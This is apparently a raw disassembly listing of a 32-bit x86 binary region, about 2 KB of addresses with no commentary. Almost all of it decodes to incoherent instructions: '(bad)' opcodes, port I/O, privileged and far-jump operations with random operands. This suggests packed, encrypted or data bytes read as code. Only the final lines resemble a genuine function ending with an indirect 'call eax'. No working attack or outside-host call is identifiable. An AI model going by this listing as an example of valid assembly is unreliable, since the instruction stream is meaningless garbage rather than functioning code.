  4162c2:	mov    cs,WORD PTR [bx+di+0x3]
  4162c6:	mov    dh,0x68
  4162c8:	sahf   
  4162c9:	push   0xc3b0bbb6
  4162ce:	fs inc eax
  4162d0:	adc    bh,bl
  4162d2:	push   ebp
  4162d3:	adc    eax,0x4e17d1a4
  4162d8:	aad    0x3
  4162da:	rdtsc  
  4162dc:	mov    DWORD PTR [ebp+0x73b4e014],0x1bda3507
  4162e6:	add    DWORD PTR [edx-0x8],ebx
  4162e9:	jns    0x41626d
  4162eb:	pop    esp
  4162ec:	repz imul DWORD PTR fs:[esi-0x15]
  4162f1:	adc    al,0x69
  4162f3:	push   0xffffffa7
  4162f5:	jmp    0xf44fa9d1
  4162fa:	stc    
  4162fb:	cmp    ecx,esi
  4162fd:	sahf   
  4162fe:	test   DWORD PTR [ebp-0x657c7687],ebx
  416304:	rcl    al,0x63
  416307:	or     DWORD PTR [edx],eax
  416309:	aas    
  41630a:	ret    0x4142
  41630d:	pushf  
  41630e:	mov    al,ds:0x5f554df9
  416313:	cld    
  416314:	ret    
  416315:	jg     0x41632c
  416317:	mov    BYTE PTR [edx],dh
  416319:	in     al,dx
  41631a:	xchg   edx,eax
  41631b:	popf   
  41631c:	cdq    
  41631d:	imul   edi,DWORD PTR [edx],0xe2384888
  416323:	jg     0x4162b5
  416325:	sti    
  416326:	mov    ds:0x660b390d,al
  41632b:	pop    ebx
  41632c:	xor    DWORD PTR [ebx+0x7],ecx
  41632f:	and    esi,esi
  416331:	jp     0x4162d7
  416333:	je     0x4162d1
  416335:	out    0xa,eax
  416337:	jns    0x416324
  416339:	mov    ebp,0xf0d9e570
  41633e:	out    dx,al
  41633f:	mov    ebx,0x738c3513
  416344:	cmp    bh,al
  416346:	inc    ecx
  416347:	fistp  WORD PTR [ebp-0x77]
  41634a:	lods   al,BYTE PTR ds:[esi]
  41634b:	mov    ch,0x4b
  41634d:	mov    cl,0x73
  41634f:	sbb    al,0x1b
  416351:	iret   
  416352:	icebp  
  416353:	mov    edi,0xff5d825b
  416358:	push   ebx
  416359:	test   esi,0xcdd25ed5
  41635f:	mov    es,WORD PTR [edx]
  416361:	xor    DWORD PTR [ebx-0x61],0x36
  416365:	mov    ecx,0x36f0a6dd
  41636a:	mov    BYTE PTR [edi-0x28],dh
  41636d:	fstp   st(7)
  41636f:	jle    0x4163ee
  416371:	push   esi
  416372:	sub    eax,DWORD PTR [edi+0x44]
  416375:	adc    BYTE PTR [edi+0x6ec072d7],dh
  41637b:	inc    ebx
  41637c:	add    al,0x5c
  41637e:	test   al,0x44
  416380:	aam    0x3e
  416382:	mov    eax,ds:0xbfea4896
  416387:	lods   al,BYTE PTR ds:[esi]
  416388:	fdiv   QWORD PTR [ebx-0x1071bf2b]
  41638e:	or     al,0x16
  416390:	cmp    DWORD PTR [ebp+0x40d4bf39],edx
  416396:	mov    edx,0x58b61fef
  41639b:	mov    dh,0x6
  41639d:	cmovne ebx,DWORD PTR [edi+0x26272d50]
  4163a4:	cs aam 0x92
  4163a7:	xor    edi,DWORD PTR [eax-0x64c3424e]
  4163ad:	sar    BYTE PTR [ebx-0x4fcaaca9],1
  4163b3:	or     eax,0xb506c1ab
  4163b8:	sbb    eax,0x8f711138
  4163bd:	push   0xffffff9b
  4163bf:	adc    ebp,ebx
  4163c1:	mov    BYTE PTR [ecx+0x210606e8],al
  4163c7:	sbb    DWORD PTR [ebx+esi*1],edi
  4163ca:	test   DWORD PTR [edi-0x28693129],0x42fded31
  4163d4:	jo     0x4163ab
  4163d6:	adc    DWORD PTR [eax-0x673d03c5],0xffffff81
  4163dd:	fisub  WORD PTR [esi]
  4163df:	xor    ch,ch
  4163e1:	pushf  
  4163e2:	pop    eax
  4163e3:	shl    DWORD PTR [edx+0x31],0xee
  4163e7:	cli    
  4163e8:	push   es
  4163e9:	inc    edi
  4163ea:	out    dx,al
  4163eb:	mov    ss,esi
  4163ed:	arpl   WORD PTR [ecx],cx
  4163ef:	add    BYTE PTR [ebx+0x3452d3ae],ah
  4163f5:	out    0xc8,al
  4163f7:	outs   dx,BYTE PTR ds:[esi]
  4163f8:	imul   edx,DWORD PTR [ebx-0x50035f29],0x2f78e02a
  416402:	retf   0x5522
  416405:	fsubr  QWORD PTR [edi-0x5d7f47ee]
  41640b:	(bad)  [edi]
  41640d:	jbe    0x41644c
  41640f:	jge    0x416456
  416411:	std    
  416412:	out    dx,eax
  416413:	arpl   WORD PTR [edi+0x16aba0fb],dx
  416419:	mov    eax,ds:0x27d433e6
  41641e:	pop    esp
  41641f:	xchg   ecx,eax
  416420:	fisubr WORD PTR [edi+0xa]
  416423:	out    0x47,al
  416425:	aas    
  416426:	outs   dx,BYTE PTR ds:[esi]
  416427:	xchg   BYTE PTR [ecx+0xb7c87ce],bh
  41642d:	fdivr  st(2),st
  41642f:	mov    esp,0x5d13015c
  416434:	das    
  416435:	xchg   edi,eax
  416436:	cs scas al,BYTE PTR es:[edi]
  416438:	ins    BYTE PTR es:[edi],dx
  416439:	or     BYTE PTR ds:0x2bcd488c,cl
  41643f:	sub    eax,DWORD PTR [edi-0x28]
  416442:	pop    ds
  416443:	rcl    DWORD PTR [eax+ebx*2],0x24
  416447:	in     al,dx
  416448:	or     ecx,ecx
  41644a:	(bad)  
  41644b:	div    BYTE PTR [ebp+0x7b9c01b5]
  416451:	nop
  416452:	dec    DWORD PTR [ebx+ebp*2]
  416455:	xchg   BYTE PTR [edx],bh
  416457:	cwde   
  416458:	xor    esi,DWORD PTR [ecx+0x2ced2596]
  41645e:	lahf   
  41645f:	sahf   
  416460:	xor    eax,0x3fd1c483
  416465:	(bad)  
  416466:	mov    ch,0x1a
  416468:	test   eax,0xb58375d7
  41646d:	mov    ?,WORD PTR [edi+0x45e1ddb]
  416473:	sub    eax,eax
  416475:	sub    eax,eax
  416477:	cmp    al,0x28
  416479:	idiv   BYTE PTR [esi+0x322acc91]
  41647f:	repnz mov WORD PTR [ecx+0x4f],?
  416483:	mov    cl,0x41
  416485:	lds    esp,FWORD PTR [esi-0x3d11be2e]
  41648b:	inc    BYTE PTR [edx+0x4e]
  41648e:	dec    edi
  41648f:	mov    ds:0xadb49696,al
  416494:	stc    
  416495:	jno    0x416476
  416497:	or     eax,0x3322e3bb
  41649c:	inc    edx
  41649d:	iret   
  41649e:	js     0x41645b
  4164a0:	jg     0x4164dc
  4164a2:	inc    esi
  4164a3:	adc    ebx,0xffffffa7
  4164a6:	cwde   
  4164a7:	mov    WORD PTR [ecx-0x5f],ds
  4164aa:	or     BYTE PTR [ebx],0x30
  4164ad:	dec    esi
  4164ae:	mov    ah,bh
  4164b0:	and    edi,ecx
  4164b2:	js     0x4164a7
  4164b4:	je     0x41644a
  4164b6:	adc    DWORD PTR [ebx],edi
  4164b8:	mov    gs,WORD PTR [ebx+0x19]
  4164bb:	xchg   ebx,eax
  4164bc:	xlat   BYTE PTR ss:[ebx]
  4164be:	mov    ebx,0xdea514db
  4164c3:	fsub   st(1),st
  4164c5:	cmp    eax,0x14825ac2
  4164ca:	pand   mm6,QWORD PTR es:[ebp+0x1058095d]
  4164d2:	ror    DWORD PTR [ebx+ecx*1],0x8d
  4164d6:	out    dx,eax
  4164d7:	cli    
  4164d8:	into   
  4164d9:	or     al,0x9b
  4164db:	push   ebx
  4164dc:	push   eax
  4164dd:	cmp    DWORD PTR gs:[esi],edx
  4164e0:	(bad)  
  4164e1:	inc    eax
  4164e2:	in     al,0x75
  4164e4:	mov    ebx,0xef0ecb14
  4164e9:	push   cs
  4164ea:	jl     0x416515
  4164ec:	imul   ebx,esp,0x71
  4164ef:	push   ss
  4164f0:	cdq    
  4164f1:	mov    ebp,0xafbe0391
  4164f6:	pushf  
  4164f7:	xchg   edi,eax
  4164f8:	loope  0x4164f1
  4164fa:	jmp    0x1fdf:0x4c9d5933
  416501:	adc    al,0xc3
  416503:	dec    ebx
  416504:	sub    eax,0xe7ae4ba5
  416509:	mov    edx,0xa7663a63
  41650e:	mov    edx,ecx
  416510:	sub    ecx,DWORD PTR [ebx-0x62]
  416513:	pop    esi
  416514:	scas   eax,DWORD PTR es:[edi]
  416515:	adc    BYTE PTR [esi+0x2089ba81],dh
  41651b:	inc    edx
  41651c:	inc    edx
  41651d:	inc    eax
  41651e:	sbb    BYTE PTR [ebp-0x5fd15cf5],dl
  416524:	jnp    0x416526
  416526:	aas    
  416527:	add    DWORD PTR [esi-0x2b],esp
  41652a:	or     eax,0x9bf76cac
  41652f:	or     BYTE PTR [ebx+0x4c],bl
  416532:	or     dh,BYTE PTR [esi+0x55]
  416535:	lahf   
  416536:	fstp   TBYTE PTR [ebp+0x2f]
  416539:	daa    
  41653a:	xchg   BYTE PTR [ecx],dl
  41653c:	ja     0x4164dd
  41653e:	sub    eax,0xf9680453
  416543:	sti    
  416544:	stc    
  416545:	mov    WORD PTR [ebx],cs
  416547:	test   ah,cl
  416549:	cmp    edi,DWORD PTR ds:0xa417eef5
  41654f:	mov    BYTE PTR [ebx],ch
  416551:	mov    ah,0xe0
  416553:	pop    ecx
  416554:	jnp    0x416562
  416556:	mov    DWORD PTR [edx+0x67],ebx
  416559:	(bad)  
  41655a:	push   eax
  41655b:	cmc    
  41655c:	stos   DWORD PTR es:[edi],eax
  41655d:	jge    0x416503
  41655f:	and    al,0x97
  416561:	push   ebx
  416562:	and    bh,dl
  416564:	(bad)  
  416565:	and    eax,0x85f186ad
  41656a:	xor    al,0x24
  41656c:	out    0xcc,al
  41656e:	imul   edi,DWORD PTR [ebx-0x28],0xa2a6ddce
  416575:	push   cs
  416576:	sbb    al,BYTE PTR [eax+0x381087a0]
  41657c:	cmp    edi,ebx
  41657e:	aad    0x30
  416580:	dec    ebp
  416581:	hlt    
  416582:	les    edi,FWORD PTR [ebp-0x375e54cf]
  416588:	neg    DWORD PTR [esi]
  41658a:	pop    ss
  41658b:	scas   eax,DWORD PTR es:[edi]
  41658c:	mov    ds:0x2b9868ad,eax
  416591:	jl     0x4165b3
  416593:	gs scas al,BYTE PTR es:[edi]
  416595:	in     eax,dx
  416596:	and    al,BYTE PTR [edx+0x7a]
  416599:	inc    esp
  41659a:	out    dx,al
  41659b:	mov    ebx,0x6ddd38a5
  4165a0:	aad    0xa2
  4165a2:	gs leave 
  4165a4:	lds    ecx,FWORD PTR [ebp-0x50]
  4165a7:	xchg   esi,eax
  4165a8:	adc    DWORD PTR [esi],esi
  4165aa:	push   edi
  4165ab:	and    al,0x6
  4165ad:	sbb    BYTE PTR [edi+0x46],cl
  4165b0:	in     al,0x63
  4165b2:	jbe    0x416542
  4165b4:	lds    edi,FWORD PTR [edx]
  4165b6:	xor    BYTE PTR [ecx+0x38b8bd58],0xb6
  4165bd:	repnz sar BYTE PTR [ebp+ecx*4+0x47dcfce5],0x2c
  4165c6:	leave  
  4165c7:	push   es
  4165c8:	and    eax,0x67c1643e
  4165cd:	(bad)  
  4165ce:	sub    al,0xde
  4165d0:	scas   al,BYTE PTR es:[di]
  4165d2:	jmp    0x4165f6
  4165d4:	or     esi,edx
  4165d6:	dec    edi
  4165d7:	mov    ebx,0xf4635ef6
  4165dc:	sub    BYTE PTR [edi],dh
  4165de:	inc    esp
  4165df:	stos   BYTE PTR es:[edi],al
  4165e0:	outs   dx,BYTE PTR ds:[esi]
  4165e1:	loop   0x416628
  4165e3:	mov    ecx,0x66258c78
  4165e8:	(bad)  
  4165e9:	sub    ecx,DWORD PTR [esi+ebx*4]
  4165ec:	mov    eax,DWORD PTR [ecx-0x45]
  4165ef:	add    eax,ebp
  4165f1:	jne    0x4165e2
  4165f3:	add    eax,0x1c321da6
  4165f8:	add    eax,0xc9db1505
  4165fd:	jmp    0x416676
  4165ff:	dec    esi
  416600:	mov    al,0x8b
  416602:	mov    edi,0x7a6edb85
  416607:	or     dh,BYTE PTR [ebp+edi*4-0x304405a0]
  41660e:	mov    edi,0x55e3f290
  416613:	push   cs
  416614:	setge  BYTE PTR [ebp-0x78]
  416618:	xor    bl,BYTE PTR [edi-0x5]
  41661b:	sub    ecx,DWORD PTR [ebp+0x615f1989]
  416621:	out    0xc0,al
  416623:	sub    eax,0xb1c89698
  416628:	in     al,dx
  416629:	lds    eax,FWORD PTR [edx]
  41662b:	xchg   esi,eax
  41662c:	or     ah,BYTE PTR [esp+edi*4+0x30]
  416630:	(bad)  
  416631:	in     eax,0x4
  416633:	sahf   
  416634:	shl    BYTE PTR [edi+eax*8-0x528cac1a],0xe4
  41663c:	clc    
  41663d:	rcr    DWORD PTR [ebx],cl
  41663f:	in     eax,0xf2
  416641:	pushf  
  416642:	adc    eax,0x92238e3e
  416647:	lods   al,BYTE PTR ds:[esi]
  416648:	repnz frstor [eax-0x6d]
  41664c:	int3   
  41664d:	add    DWORD PTR [esi-0x42d255f3],edi
  416653:	fsubrp st(2),st
  416655:	loopne 0x41664d
  416657:	loope  0x416646
  416659:	into   
  41665a:	aad    0xd7
  41665c:	xor    BYTE PTR [ebx-0x9],bh
  41665f:	std    
  416660:	clc    
  416661:	call   0xed34e2ca
  416666:	test   BYTE PTR [edi],bh
  416668:	cli    
  416669:	cmp    eax,0x453b3c60
  41666e:	inc    esi
  41666f:	push   es
  416670:	dec    ebx
  416671:	fcom   st(5)
  416673:	sub    ah,dh
  416675:	shl    DWORD PTR [ecx],cl
  416677:	pop    esi
  416678:	cld    
  416679:	add    DWORD PTR [eax],0x6e81eeba
  41667f:	jo     0x41665e
  416681:	push   ss
  416682:	bswap  eax
  416684:	fwait
  416685:	cmp    eax,DWORD PTR [esi]
  416687:	xchg   ebx,eax
  416688:	(bad)  
  416689:	sub    al,0x8
  41668b:	and    eax,0x46d15827
  416690:	inc    ebx
  416691:	or     bh,ch
  416693:	or     al,0x3f
  416695:	test   DWORD PTR [edx],esp
  416697:	sti    
  416698:	ja     0x4166bc
  41669a:	or     al,0x27
  41669c:	mov    al,ds:0xcb2e8573
  4166a1:	push   es
  4166a2:	pop    ds
  4166a3:	iret   
  4166a4:	or     al,0xc1
  4166a6:	sbb    edi,esi
  4166a8:	inc    edi
  4166a9:	fadd   DWORD PTR [edx-0x10d49bf3]
  4166af:	mov    eax,ds:0x20c34955
  4166b4:	or     DWORD PTR [eax+0x49],edx
  4166b7:	retf   0xc9af
  4166ba:	xchg   esp,eax
  4166bb:	clc    
  4166bc:	push   edi
  4166bd:	sub    al,0xf0
  4166bf:	inc    ebp
  4166c0:	leave  
  4166c1:	test   esi,eax
  4166c3:	xor    esi,DWORD PTR [esi+0x40]
  4166c6:	xchg   edi,eax
  4166c7:	pop    ds
  4166c8:	cmp    DWORD PTR [ebx+0x45],edx
  4166cb:	cs clc 
  4166cd:	xchg   DWORD PTR [edx],edi
  4166cf:	pop    esi
  4166d0:	out    dx,al
  4166d1:	stos   BYTE PTR es:[edi],al
  4166d2:	cmp    eax,0x73222888
  4166d7:	ja     0x4166e1
  4166d9:	aam    0xa4
  4166db:	mov    edx,0x879e90ca
  4166e0:	pop    es
  4166e1:	(bad)  
  4166e2:	pop    eax
  4166e3:	icebp  
  4166e4:	call   0xe2ce:0x51348dcb
  4166eb:	aad    0xda
  4166ed:	pop    ebp
  4166ee:	test   eax,0x5778c188
  4166f3:	outs   dx,DWORD PTR ds:[esi]
  4166f4:	ja     0x41670f
  4166f6:	sub    BYTE PTR [ebp+eiz*4-0xfba879e],bh
  4166fd:	and    ebx,DWORD PTR [ebx+0x6a6cebaa]
  416703:	fcomp  DWORD PTR [ebx-0x60c60258]
  416709:	cmp    eax,0x2b8c316e
  41670e:	xchg   esi,eax
  41670f:	push   ss
  416710:	cmp    DWORD PTR [ecx-0x38],ebx
  416713:	xlat   BYTE PTR ds:[ebx]
  416714:	adc    eax,0x2b0d47fd
  416719:	add    DWORD PTR [edi],ecx
  41671b:	jecxz  0x41679b
  41671d:	xchg   ebx,eax
  41671e:	mov    ebx,0xfbe608a7
  416723:	and    BYTE PTR [ecx],0x4c
  416726:	inc    eax
  416727:	xor    esi,ecx
  416729:	pop    eax
  41672a:	xor    BYTE PTR [eax-0x77],0xdb
  41672e:	add    al,0x3c
  416730:	int    0x4f
  416732:	xchg   ebp,eax
  416733:	loop   0x4166b6
  416735:	fidivr WORD PTR [ecx]
  416737:	pop    es
  416738:	rcr    ecx,1
  41673a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41673b:	xchg   ecx,eax
  41673c:	cmp    al,dh
  41673e:	push   ds
  41673f:	sbb    esp,esi
  416741:	outs   dx,BYTE PTR ds:[esi]
  416742:	xchg   edi,eax
  416743:	inc    ebp
  416744:	sub    BYTE PTR [eax+0x75],0x1c
  416748:	add    al,BYTE PTR [esi+edx*4+0x1c]
  41674c:	lods   al,BYTE PTR ds:[esi]
  41674d:	push   es
  41674e:	mov    ds:0x38f33b0c,al
  416753:	and    BYTE PTR [edx+0x36],0x2d
  416757:	das    
  416758:	push   edi
  416759:	and    al,0x2f
  41675b:	xchg   ecx,eax
  41675c:	sbb    eax,0xae3ec28b
  416761:	inc    edi
  416762:	ss (bad) 
  416765:	les    esi,FWORD PTR [ecx-0x5f]
  416768:	cdq    
  416769:	daa    
  41676a:	xchg   BYTE PTR [ebp+0x34],ch
  41676d:	arpl   WORD PTR [edi],bx
  41676f:	fmul   QWORD PTR [eax*8+0x1c002b50]
  416776:	dec    edx
  416777:	pop    es
  416778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41677a:	std    
  41677b:	xchg   ebp,eax
  41677c:	mov    WORD PTR [eax-0x75],ds
  41677f:	and    DWORD PTR [ecx],edx
  416781:	jg     0x416723
  416783:	fisttp DWORD PTR [ecx-0x4a]
  416786:	fistp  QWORD PTR [ebp+0x7e6709f5]
  41678c:	mov    ds:0x6aed3dd4,eax
  416791:	jnp    0x416764
  416793:	sub    ebx,ecx
  416795:	mov    ah,BYTE PTR [esi+0x3494cd47]
  41679b:	dec    esi
  41679c:	arpl   WORD PTR [ebx+0x30],ax
  41679f:	or     DWORD PTR [esi-0x342b4b93],ecx
  4167a5:	inc    ecx
  4167a6:	and    DWORD PTR ds:0xf367d84f,0xffffffb1
  4167ad:	jns    0x416800
  4167af:	jle    0x41681b
  4167b1:	retf   
  4167b2:	push   esp
  4167b3:	cdq    
  4167b4:	add    al,0xf1
  4167b6:	sbb    eax,0x73299140
  4167bb:	sbb    ah,dh
  4167bd:	jg     0x416777
  4167bf:	sub    eax,0xa55eae1b
  4167c4:	xchg   BYTE PTR [edi],bl
  4167c6:	pop    es
  4167c7:	into   
  4167c8:	int3   
  4167c9:	sbb    eax,0x51949273
  4167ce:	dec    esp
  4167cf:	sar    DWORD PTR [edi],0x59
  4167d2:	or     al,0x0
  4167d4:	neg    DWORD PTR [edx-0x5f]
  4167d7:	jo     0x416819
  4167d9:	dec    eax
  4167da:	sbb    ebx,DWORD PTR [edx+edx*2+0x23]
  4167de:	add    eax,DWORD PTR [edi]
  4167e0:	jge    0x416817
  4167e2:	lock fwait
  4167e4:	nop
  4167e5:	scas   eax,DWORD PTR es:[edi]
  4167e6:	fxch   st(0)
  4167e8:	xchg   ebx,eax
  4167e9:	fcom   st(3)
  4167eb:	outs   dx,BYTE PTR ds:[esi]
  4167ec:	cdq    
  4167ed:	lea    esp,ds:0x139c6be
  4167f3:	mov    ah,0x33
  4167f5:	push   edx
  4167f6:	or     al,0x8
  4167f8:	sbb    edx,esp
  4167fa:	sbb    ebp,ebp
  4167fc:	test   al,0xd4
  4167fe:	inc    ecx
  4167ff:	call   0x2e5f:0xa4598747
  416806:	push   ecx
  416807:	cmp    eax,0x38e49f22
  41680c:	inc    edx
  41680d:	js     0x416865
  41680f:	stos   DWORD PTR es:[edi],eax
  416810:	mov    ds:0x85c10dba,al
  416815:	das    
  416816:	lahf   
  416817:	cmc    
  416818:	inc    edx
  416819:	js     0x416849
  41681b:	ins    BYTE PTR es:[edi],dx
  41681c:	out    0x74,al
  41681e:	mov    dh,0x29
  416820:	cmp    eax,0x6f607558
  416825:	push   0xfffffffc
  416827:	push   ebp
  416828:	popf   
  416829:	mov    ebx,0x65df08e0
  41682e:	stc    
  41682f:	loopne 0x4167be
  416831:	stos   DWORD PTR es:[edi],eax
  416832:	mov    edi,0xd6384839
  416837:	and    DWORD PTR [edx-0x45483a68],0x183f10a1
  416841:	push   ecx
  416842:	mov    BYTE PTR [ecx-0x35],bl
  416845:	(bad)  
  416846:	dec    edi
  416847:	shr    ch,1
  416849:	mov    fs,WORD PTR [ebx]
  41684b:	jns    0x416831
  41684d:	push   cs
  41684e:	lea    ebx,[ebx+0x3a1e37a4]
  416854:	test   al,0xf
  416856:	xor    al,0xcf
  416858:	and    DWORD PTR [edx],0xb1e0243c
  41685e:	rol    BYTE PTR [edx],1
  416860:	rcr    ebx,0x93
  416863:	retf   
  416864:	lock adc bl,bl
  416867:	dec    esi
  416868:	sbb    DWORD PTR ds:0x9ac36d3d,ecx
  41686e:	dec    ecx
  41686f:	xchg   edi,eax
  416870:	mov    cl,0xf
  416872:	adc    eax,0x42d36b8c
  416877:	push   0xc2ee623
  41687c:	adc    DWORD PTR [esi-0x19],0x7a447900
  416883:	mov    bh,0xf5
  416885:	xchg   edi,eax
  416886:	(bad)  
  416887:	pop    ebp
  416888:	fs jecxz 0x416850
  41688b:	clc    
  41688c:	fldcw  WORD PTR [edi-0x13]
  41688f:	stos   DWORD PTR es:[edi],eax
  416890:	mov    al,0x99
  416892:	mov    ch,0x46
  416894:	jmp    0x8f2459d5
  416899:	mov    edx,0xf0d9d783
  41689e:	mov    bl,0x6
  4168a0:	dec    ecx
  4168a1:	sysenter 
  4168a3:	pop    edi
  4168a4:	dec    edi
  4168a5:	stos   BYTE PTR es:[edi],al
  4168a6:	enter  0x7f24,0x9e
  4168aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168ab:	fidivr WORD PTR [eax]
  4168ad:	inc    esi
  4168ae:	push   es
  4168af:	pop    eax
  4168b0:	cmc    
  4168b1:	jmp    0xd248:0x2281d825
  4168b8:	or     esp,DWORD PTR [edi+0x24]
  4168bb:	popa   
  4168bc:	or     ax,0xe483
  4168c0:	inc    edi
  4168c1:	jae    0x416877
  4168c3:	mov    DWORD PTR [ebx+0x3f],esi
  4168c6:	mov    al,0x63
  4168c8:	js     0x416888
  4168ca:	outs   dx,DWORD PTR ds:[esi]
  4168cb:	pop    es
  4168cc:	ret    0xc78e
  4168cf:	pop    ebp
  4168d0:	sahf   
  4168d1:	ror    DWORD PTR [ecx-0x4a93becf],cl
  4168d7:	cmp    BYTE PTR [esi+eiz*1],dl
  4168da:	mov    ebx,0x536c5162
  4168df:	cmp    DWORD PTR [edi],edx
  4168e1:	mov    WORD PTR [edi+0x1e7d24d3],?
  4168e7:	out    0x8e,eax
  4168e9:	mov    esp,0x4b1a58f
  4168ee:	mov    cs,WORD PTR [eax+0x2176cf0e]
  4168f4:	outs   dx,BYTE PTR ds:[esi]
  4168f5:	cmp    BYTE PTR [ebp+edi*2-0x6a],dh
  4168f9:	pushf  
  4168fa:	imul   ebp,DWORD PTR [esi+0x8],0x9e705c80
  416901:	aam    0x35
  416903:	xchg   BYTE PTR [eax],al
  416905:	adc    esp,edi
  416907:	xchg   esi,eax
  416908:	push   DWORD PTR [eax+eax*4]
  41690b:	out    0xb0,eax
  41690d:	push   eax
  41690e:	jg     0x4168e7
  416910:	fild   QWORD PTR cs:[edi]
  416913:	mov    ah,0xa5
  416915:	sbb    ecx,DWORD PTR [ebp-0x2f]
  416918:	mov    edi,0x6ae8b994
  41691d:	lock mov esi,0x41440412
  416923:	sbb    eax,0xb074df8a
  416928:	fsubr  QWORD PTR [esp+ecx*8+0x34]
  41692c:	xchg   ebx,eax
  41692d:	pop    ss
  41692e:	shrd   DWORD PTR [ebx-0x1a],ebp,cl
  416932:	rcr    BYTE PTR [ecx-0x66627831],1
  416938:	or     al,al
  41693a:	jge    0x4168d8
  41693c:	(bad)  
  41693d:	and    al,0x27
  41693f:	(bad)  
  416940:	jge    0x4169b8
  416942:	cdq    
  416943:	add    DWORD PTR gs:[esi+eax*2+0x5db5c751],edx
  41694b:	jb     0x4168e4
  41694d:	(bad)  
  41694e:	pushf  
  41694f:	jg     0x4168d2
  416951:	inc    esi
  416952:	arpl   WORD PTR [esi+0x28e51fbb],ax
  416958:	xor    BYTE PTR [edi+0x72],bl
  41695b:	out    dx,al
  41695c:	hlt    
  41695d:	repz and BYTE PTR [esi],bl
  416960:	int3   
  416961:	dec    ebx
  416962:	retf   0xdf87
  416965:	rol    cl,1
  416967:	lods   eax,DWORD PTR ds:[esi]
  416968:	inc    esi
  416969:	loope  0x41697c
  41696b:	add    ebx,ebp
  41696d:	mov    eax,0xd8f6dfe8
  416972:	push   edx
  416973:	(bad)  
  416974:	and    esp,DWORD PTR [edx+0x65]
  416977:	jnp    0x4169ca
  416979:	mov    esi,0xac546f04
  41697e:	jo     0x416912
  416980:	ja     0x4169a0
  416982:	push   0x1c
  416984:	push   ebp
  416985:	sbb    eax,0x914b9b65
  41698a:	xchg   esp,eax
  41698b:	push   ebx
  41698c:	mov    ecx,0x98be258a
  416991:	adc    edx,DWORD PTR [esi]
  416993:	lahf   
  416994:	adc    eax,0x36441ecc
  416999:	lods   al,BYTE PTR ds:[esi]
  41699a:	mov    eax,0x1712dd0d
  41699f:	icebp  
  4169a0:	arpl   WORD PTR [esi],cx
  4169a2:	sbb    DWORD PTR [esi+0x9],ebp
  4169a5:	jne    0x41698e
  4169a7:	inc    esi
  4169a8:	mov    ds:0xa05e7837,al
  4169ad:	mov    ecx,0xf040a987
  4169b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169b3:	daa    
  4169b4:	stc    
  4169b5:	fdivr  DWORD PTR [edi]
  4169b7:	(bad)  
  4169b8:	mov    bh,BYTE PTR [eax-0xf]
  4169bb:	call   0x3a88:0x35d6a9b3
  4169c2:	jno    0x4169a8
  4169c4:	pusha  
  4169c5:	mov    ah,0x20
  4169c7:	mov    esp,0xb726e9c
  4169cc:	lods   al,BYTE PTR ds:[esi]
  4169cd:	mov    ecx,0xf79de9ef
  4169d2:	push   ebp
  4169d3:	dec    DWORD PTR [ebx-0x45323866]
  4169d9:	pop    ecx
  4169da:	xchg   edx,eax
  4169db:	sti    
  4169dc:	or     ah,BYTE PTR [edi-0x54]
  4169df:	mov    ch,0x88
  4169e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169e2:	sbb    eax,DWORD PTR [ecx+0x45574d52]
  4169e8:	ficom  DWORD PTR [edi+0x2a1f77a6]
  4169ee:	imul   bl
  4169f0:	(bad)
  4169f4:	adc    ecx,DWORD PTR [eax+0x76a11119]
  4169fa:	or     DWORD PTR ds:0x18750a84,ecx
  416a00:	shl    DWORD PTR [esi+0x64],1
  416a03:	mov    ah,0x1e
  416a05:	dec    edx
  416a06:	push   edx
  416a07:	sub    DWORD PTR [ecx],ebp
  416a09:	push   0xec611940
  416a0e:	jg     0x416a0c
  416a10:	or     DWORD PTR [eax],esp
  416a12:	pop    edi
  416a13:	int    0x71
  416a15:	(bad)  
  416a16:	loope  0x4169bc
  416a18:	and    edi,DWORD PTR [esp+ebx*4+0xd850655]
  416a1f:	test   BYTE PTR [esi-0x78c89e88],0xa5
  416a26:	mov    dl,0x52
  416a28:	push   ds
  416a29:	data16 js 0x416a79
  416a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a2d:	dec    esp
  416a2e:	mov    eax,0x5309e5f7
  416a33:	lea    esi,[edi+0x11a22b76]
  416a39:	shl    DWORD PTR ds:0x97d0b4ea,0x5c
  416a40:	add    eax,0x2c42462f
  416a45:	les    ecx,FWORD PTR ds:0x2d9c3103
  416a4b:	sbb    ah,BYTE PTR [esi+0xe1793d3]
  416a51:	xlat   BYTE PTR ds:[ebx]
  416a52:	jae    0x416a49
  416a54:	jne    0x416a69
  416a56:	sub    DWORD PTR [ebp-0x17],ebx
  416a59:	jno    0x416a11
  416a5b:	mov    edx,DWORD PTR [edx]
  416a5d:	dec    ecx
  416a5e:	mov    cl,0xaa
  416a60:	outs   dx,BYTE PTR ds:[esi]
  416a61:	leave  
  416a62:	out    0xa2,eax
  416a64:	in     al,dx
  416a65:	dec    edi
  416a66:	cmp    edi,DWORD PTR [edi+0xc]
  416a69:	enter  0x6344,0x7c
  416a6d:	mov    cs,WORD PTR [eax]
  416a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a70:	dec    ebp
  416a71:	dec    ebx
  416a72:	pop    esp
  416a73:	ffreep st(2)
  416a75:	push   0x13e6e1d0
  416a7a:	mov    al,0xb
  416a7c:	mov    esp,0xd716ccbd
  416a81:	xor    BYTE PTR [edx-0x3ce3785b],0xc5
  416a88:	scas   eax,DWORD PTR es:[edi]
  416a89:	bound  ecx,QWORD PTR [ebp+0x79]
  416a8c:	mov    ds:0x87721a53,eax
  416a91:	in     al,dx
  416a92:	mov    BYTE PTR [ecx],ah
  416a94:	hlt    
  416a95:	and    DWORD PTR [ecx-0x7b56bf],esi
  416a9b:	jne    0x416a7d
  416a9d:	mov    eax,DWORD PTR [ebp-0x8]
  416aa0:	mov    eax,DWORD PTR [eax]
  416aa2:	mov    eax,DWORD PTR [eax]
  416aa4:	mov    eax,DWORD PTR [eax]
  416aa6:	call   eax
  416aa8:	mov    eax,DWORD PTR [ebp-0x34]
  416aab:	mov    ecx,DWORD PTR ds:0x42409c
  416ab1:	add    DWORD PTR [eax],ecx
  416ab3:	pop    edi
  416ab4:	pop    esi
  416ab5:	leave  
  416ab6:	ret    
  416ab7:	push   ebp
  416ab8:	mov    ebp,esp
  416aba:	sub    esp,0x18
